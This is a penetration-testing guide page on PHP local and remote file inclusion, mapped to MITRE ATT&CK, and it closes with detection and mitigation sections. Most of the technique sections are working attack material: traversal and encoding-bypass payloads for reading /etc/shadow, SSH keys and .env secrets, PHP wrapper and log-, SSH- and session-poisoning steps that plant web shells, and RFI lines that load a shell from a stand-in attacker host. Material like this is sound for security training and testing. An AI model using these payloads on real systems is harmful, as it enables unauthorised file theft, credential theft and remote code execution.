% Filename: 04-web-testing/file-attacks/file-inclusion.md
% Display name: File Inclusion (LFI/RFI)
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0002 (Execution)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
% Authors: @TristanInSec

# File Inclusion (LFI/RFI)

## Overview

File inclusion vulnerabilities occur when an application dynamically includes files based on user-controlled input. Local File Inclusion (LFI) includes files already present on the server. Remote File Inclusion (RFI) includes files from an external URL. Both can lead to source code disclosure, sensitive file reads, and remote code execution.

LFI is far more common than RFI in modern applications. RFI requires specific PHP configuration (`allow_url_include=On`), which is disabled by default since PHP 5.2.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0002 - Execution
- **Technique:** T1059 - Command and Scripting Interpreter

## Prerequisites

- Application includes files based on user input (e.g., `include($_GET['page'])` in PHP)
- Insufficient input validation on file path parameters
- For RFI: `allow_url_include=On` in PHP (disabled by default)

## Detection Methodology

### Identifying Inclusion Points

Look for URL parameters that suggest file inclusion:

```text
http://target.com/page?file=about
http://target.com/page?page=contact
http://target.com/page?template=default
http://target.com/page?lang=en
http://target.com/page?include=header
http://target.com/page?view=news
```

### Boundary Testing

```bash
# Basic LFI test
?file=../../../etc/passwd
?file=....//....//....//etc/passwd

# Null byte (PHP < 5.3.4)
?file=../../../etc/passwd%00

# PHP wrapper test
?file=php://filter/convert.base64-encode/resource=index.php

# RFI test
?file=http://attacker.com/shell.txt
?file=//attacker.com/shell.txt
```

If `/etc/passwd` contents appear in the response, LFI is confirmed.

## Techniques

### Basic LFI

Traverse the directory structure to read files outside the intended directory:

```text
?file=../../../etc/passwd
?file=../../../etc/shadow
?file=../../../etc/hostname
?file=../../../proc/self/environ
?file=../../../proc/self/cmdline
?file=../../../var/log/apache2/access.log
?file=../../../var/log/apache2/error.log
```

The number of `../` sequences needed depends on the current working directory of the include function. Start with many and reduce — extra `../` at the filesystem root are ignored.

**Windows targets:**

```text
?file=..\..\..\..\windows\win.ini
?file=..\..\..\..\windows\system32\drivers\etc\hosts
?file=..\..\..\..\inetpub\wwwroot\web.config
?file=..\..\..\..\xampp\apache\conf\httpd.conf
```

### Traversal Filter Bypass

**Double encoding:**

```text
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

**UTF-8 encoding:**

```text
?file=..%c0%af..%c0%af..%c0%afetc/passwd
```

**Doubled traversal (if filter strips `../` once):**

```text
?file=....//....//....//etc/passwd
?file=..././..././..././etc/passwd
```

**Null byte injection (PHP < 5.3.4):**

When the application appends an extension (e.g., `include($file . ".php")`):

```text
?file=../../../etc/passwd%00
```

The null byte terminates the string before `.php` is appended.

**Path truncation (PHP < 5.3):**

PHP has a maximum path length (~4096 chars on Linux). Pad the path to truncate the appended extension:

```text
?file=../../../etc/passwd/./././././././...  (repeat until 4096 chars)
```

### PHP Wrappers

PHP stream wrappers extend LFI capabilities significantly.

**php://filter — Read source code:**

```bash
# Base64-encode the source code (prevents PHP execution)
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../config/database.php
```

Decode the output:

```bash
echo "PD9waHAKJGRiX2hvc3Q9J2xvY2FsaG9zdCc7Cg==" | base64 -d
```

This is invaluable for reading PHP source that would otherwise be executed and not displayed.

**php://input — Execute code via POST body (requires `allow_url_include=On`):**

```bash
curl -X POST "http://target.com/page?file=php://input" \
  -d "<?php system('id'); ?>"
```

**data:// — Inline code execution (requires `allow_url_include=On`):**

```text
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

The base64 decodes to `<?php system('id'); ?>`.

**expect:// — Direct command execution (requires `expect` extension):**

```text
?file=expect://id
?file=expect://whoami
```

The `expect` extension is rarely installed in production.

**zip:// — Execute from ZIP archive:**

1. Create a ZIP containing a PHP shell
2. Upload via file upload functionality
3. Include the PHP file inside the ZIP:

```text
?file=zip:///var/www/uploads/shell.zip%23shell.php
```

`%23` is URL-encoded `#` — the fragment separator for the file within the ZIP.

**phar:// — Execute from PHAR archive:**

Similar to zip:// but uses PHP Archive format:

```text
?file=phar:///var/www/uploads/shell.phar/shell.php
```

### LFI to RCE via Log Poisoning

Inject PHP code into a log file, then include the log file.

**Apache access log poisoning:**

```bash
# Step 1: Inject PHP into the User-Agent (logged by Apache)
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the access log
# ?file=../../../var/log/apache2/access.log&cmd=id
```

Common log file paths:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/syslog
/var/log/auth.log
/proc/self/fd/1         (stdout — sometimes points to access log)
```

**SSH log poisoning (auth.log):**

```bash
# Step 1: Attempt SSH login with PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include auth.log
# ?file=../../../var/log/auth.log&cmd=id
```

**Mail log poisoning:**

```bash
# Step 1: Send email with PHP in subject/body
# (requires SMTP access to the target)

# Step 2: Include mail log
# ?file=../../../var/log/mail.log&cmd=id
```

### LFI to RCE via /proc

**Environment variables:**

```text
?file=../../../proc/self/environ
```

If the application logs `HTTP_USER_AGENT` or other headers in `/proc/self/environ`, inject PHP code in those headers.

**File descriptor access:**

```text
?file=../../../proc/self/fd/0
?file=../../../proc/self/fd/1
?file=../../../proc/self/fd/2
```

### LFI to RCE via PHP Session

If the application stores user-controlled data in PHP sessions:

```bash
# Step 1: Set a session value containing PHP code
# (e.g., username field stored in session)
curl -b "PHPSESSID=abc123" "http://target.com/login" \
  -d "username=<?php system(\$_GET['cmd']); ?>&password=test"

# Step 2: Include the session file
# PHP sessions are stored in /tmp/sess_<session_id> or /var/lib/php/sessions/sess_<session_id>
?file=../../../tmp/sess_abc123&cmd=id
```

### Remote File Inclusion (RFI)

Requires `allow_url_include=On` in PHP (disabled by default):

```text
?file=http://attacker.com/shell.txt
?file=https://attacker.com/shell.txt
?file=ftp://attacker.com/shell.txt
```

Host a PHP shell on the attacker server (use `.txt` extension so the attacker's server doesn't execute it):

```bash
# On attacker machine
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8000
```

**RFI with null byte (if extension is appended):**

```text
?file=http://attacker.com/shell.txt%00
```

### Useful Files to Read

**Linux:**

```text
/etc/passwd                          (user enumeration)
/etc/shadow                          (password hashes — requires root)
/etc/hostname                        (hostname)
/etc/hosts                           (internal network mapping)
/proc/self/environ                   (environment variables — may contain secrets)
/proc/self/cmdline                   (process command line)
/proc/version                        (kernel version)
/home/<user>/.ssh/id_rsa             (SSH private keys)
/home/<user>/.bash_history           (command history)
/var/www/html/.env                   (application secrets)
/var/www/html/config.php             (database credentials)
/var/www/html/wp-config.php          (WordPress database credentials)
```

**Windows:**

```text
C:\Windows\win.ini                   (confirm file read)
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config        (IIS configuration — may contain credentials)
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\.ssh\id_rsa
```

## Detection Methods

### Network-Based Detection

- Path traversal sequences in URL parameters (`../`, `..%2f`, `%2e%2e/`)
- PHP wrapper protocols in parameters (`php://`, `data://`, `expect://`, `zip://`)
- External URLs in file inclusion parameters (`http://`, `ftp://`)
- Requests for sensitive system files (`/etc/passwd`, `win.ini`, `web.config`)

### Host-Based Detection

- Web server accessing files outside the document root
- PHP `include`/`require` errors in application logs referencing unexpected paths
- Access to log files or `/proc` filesystem from web application context
- File access patterns indicating traversal (many `../` resolved in path)

## Mitigation Strategies

- **Avoid dynamic file inclusion** — use a whitelist of allowed files rather than including based on user input. Map user-selectable values to fixed file paths (e.g., `page=1` maps to `about.php`, not `include($_GET['page'])`)
- **Input validation** — reject traversal sequences (`../`, `..\\`), null bytes, and wrapper protocols. Validate that the resolved path stays within the intended directory using `realpath()` and prefix comparison
- **Disable dangerous PHP settings** — set `allow_url_include=Off` and `allow_url_fopen=Off` in `php.ini` to prevent RFI
- **Least privilege** — run the web server as a low-privilege user that cannot read sensitive files (`/etc/shadow`, SSH keys, configuration files outside the web root)
- **Chroot/containerize** — isolate the web application filesystem to prevent access to system files

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP - Testing for File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion)
- [OWASP - Testing for Remote File Inclusion (v4.2)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
